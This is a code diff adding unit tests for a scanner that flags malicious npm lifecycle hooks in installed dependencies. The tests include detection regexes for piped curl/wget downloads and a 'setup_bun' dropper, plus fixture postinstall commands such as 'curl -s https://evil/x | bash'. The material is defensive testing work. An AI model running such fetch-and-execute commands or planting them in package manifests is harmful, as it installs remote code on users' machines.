@@ -181,5 +181,66 @@ class TestRecordIntegrity(unittest.TestCase):
         self.assertEqual(list(NpmInstalledTree().tampered(t)), [])   # npm has no on-disk RECORD
 
 
+_HOOK_SIG = {"id": "installed-lifecycle-hook", "category": "supply-chain-dep", "severity": "critical",
+             "description": "installed dep lifecycle hook runs a payload"}
+# The npm-lifecycle patterns as they live in signatures.yml (confirmed + the heuristic exec one).
+_NPM_SIGS = [
+    {"id": "npm-lifecycle-dropper", "matcher": "npm-manifest", "pattern": r"\bsetup_bun\b"},
+    {"id": "npm-lifecycle-remote-fetch", "matcher": "npm-manifest",
+     "pattern": r"\b(?:curl|wget)\b[^|]{0,2048}\|\s*(?:sh|bash|node|bun|bunx|deno)\b"},
+    {"id": "npm-lifecycle-exec", "matcher": "npm-manifest", "confidence": "heuristic",
+     "pattern": r"\b(?:bun|bunx|deno|curl|wget)\b"},
+]
+
+
+def _npm_hooks_repo(hooks: dict) -> Target:
+    """node_modules deps (all LOCKED, so no ghost noise) each with a postinstall = `hooks[name]`."""
+    d = Path(tempfile.mkdtemp())
+    packages = {"": {"name": "app"}}
+    for name in hooks:
+        packages[f"node_modules/{name}"] = {"version": "1.0.0"}
+    (d / "package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": packages}))
+    for name, cmd in hooks.items():
+        pd = d / "node_modules" / name
+        pd.mkdir(parents=True)
+        (pd / "package.json").write_text(json.dumps(
+            {"name": name, "version": "1.0.0", "scripts": {"postinstall": cmd}}))
+    return Target(d, str(d), ScanOptions())
+
+
+def _scan_hooks(target):
+    m = InstalledPackageAuditMatcher(store_factory=lambda s: _FakeStore(()))
+    sigs = [_MAL_SIG, _GHOST_SIG, _HOOK_SIG]
+    return {f.signature_id for f in m.scan(target, sigs, all_signatures=sigs + _NPM_SIGS)}
+
+
+class TestInstalledLifecycleHook(unittest.TestCase):
+    def test_malicious_dependency_postinstall_flagged(self):
+        # A malicious dep's postinstall in node_modules — invisible to the root-manifest/lockfile audit.
+        self.assertIn("installed-lifecycle-hook",
+                      _scan_hooks(_npm_hooks_repo({"evil": "curl -s https://evil/x | bash"})))
+
+    def test_setup_bun_dropper_flagged(self):
+        self.assertIn("installed-lifecycle-hook",
+                      _scan_hooks(_npm_hooks_repo({"evil": "node setup_bun.js"})))
+
+    def test_legit_postinstalls_are_clean(self):
+        # 0 FP on realistic legit hooks (node-gyp/husky/binary-download/node-script).
+        clean = _npm_hooks_repo({"a": "node-gyp rebuild", "b": "husky install",
+                                 "c": "curl -sSL https://x/tool -o bin/t", "d": "node ./scripts/pi.js"})
+        self.assertNotIn("installed-lifecycle-hook", _scan_hooks(clean))
+
+    def test_heuristic_exec_pattern_not_applied_at_install_scale(self):
+        # `bun run build` / a curl DOWNLOAD (no pipe) trip only the HEURISTIC exec pattern — which is
+        # deliberately NOT applied to installed deps (it FPs across hundreds of third-party packages).
+        self.assertNotIn("installed-lifecycle-hook",
+                         _scan_hooks(_npm_hooks_repo({"a": "bun run build", "b": "deno task setup"})))
+
+    def test_python_wheels_have_no_lifecycle_hooks(self):
+        # A wheel install carries no npm-style lifecycle scripts → nothing to scan (no crash).
+        t = Target(_venv({"requests": "2.31.0"}), "t", ScanOptions())
+        self.assertNotIn("installed-lifecycle-hook", _scan_hooks(t))
+
+
 if __name__ == "__main__":
     unittest.main()
